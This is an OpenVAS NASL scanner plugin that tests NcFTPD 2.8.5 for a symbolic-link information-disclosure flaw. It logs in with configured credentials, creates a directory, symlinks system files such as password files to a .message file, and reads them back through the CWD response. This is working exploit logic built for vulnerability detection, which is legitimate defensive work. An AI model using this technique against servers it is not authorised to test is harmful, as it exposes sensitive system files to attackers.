###############################################################################
# OpenVAS Vulnerability Test
# $Id: ncftpd_35822.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# NcFTPD Symbolic Link Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100250");
  script_version("$Revision: 13994 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-07-28 21:43:08 +0200 (Tue, 28 Jul 2009)");
  script_bugtraq_id(35822);
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_name("NcFTPD Symbolic Link Information Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/ncftpd/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35822");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/52067");
  script_xref(name:"URL", value:"http://www.ncftpd.com/ncftpd/");

  script_tag(name:"summary", value:"NcFTPD is prone to a remote information-disclosure vulnerability.");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to view sensitive information.
  Information obtained may lead to further attacks.");

  script_tag(name:"affected", value:"NcFTPD 2.8.5 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("ftp_func.inc");
include("misc_func.inc");

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
if("anonymous" >< user || "ftp" >< user)
  exit(0);

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(! banner || "NcFTPd" >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1)
  exit(0);

files = traversal_files();

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2) {

      vtstrings = get_vt_strings();
      dir = vtstrings["lowercase_rand"];

      mkdir =  ftp_send_cmd(socket: soc1, cmd:string("MKD ", dir));
      if(mkdir =~ "257.*directory created") {

        foreach pattern(keys(files)) {

          file = files[pattern];

          slink = ftp_send_cmd(socket: soc1, cmd:string("site symlink /", file, " ", dir,"/.message"));
    	  if(slink =~ "250 Symlinked") {
            cd = ftp_send_cmd(socket: soc1, cmd:string("CWD ", dir));
            if(egrep(string:cd, pattern:pattern))  {

              close(soc2);
	      ftp_close(socket:soc1);
  	      close(soc1);

              info = string("Here are the contents of the file '/" + file + "' that was read from the remote host:\n\n");
              info += cd;
              info += string("\n\nPlease delete the directory ");
              info += dir;
              info += string(" immediately.\n");
  	      security_message(port:ftpPort, data:info);
      	      exit(0);
            }
          }
	}
      }
      close(soc2);
    }
  }
}

ftp_close(socket:soc1);
close(soc1);
exit(99);